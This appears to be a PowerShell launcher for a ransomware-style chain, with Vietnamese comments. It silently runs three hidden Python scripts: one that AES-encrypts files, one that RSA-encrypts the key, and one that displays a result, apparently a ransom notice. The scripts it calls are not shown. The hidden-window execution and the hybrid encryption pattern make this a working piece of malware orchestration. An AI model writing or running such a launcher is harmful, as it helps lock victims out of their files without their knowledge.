$scriptPath = $PSScriptRoot

# Chạy file AES đầu tiên để mã hóa tệp
Start-Process "pythonw.exe" -ArgumentList "$scriptPath\AES_Encrypt_File_Version2.pyw" -WindowStyle Hidden
# Chạy file RSA tiếp theo để mã hóa khóa
Start-Process "pythonw.exe" -ArgumentList "$scriptPath\RSA_Encrypt_key.pyw" -WindowStyle Hidden
# Chạy file Display cuối cùng để hiển thị kết quả
Start-Process "pythonw.exe" -ArgumentList "$scriptPath\Display.pyw" -WindowStyle Hidden
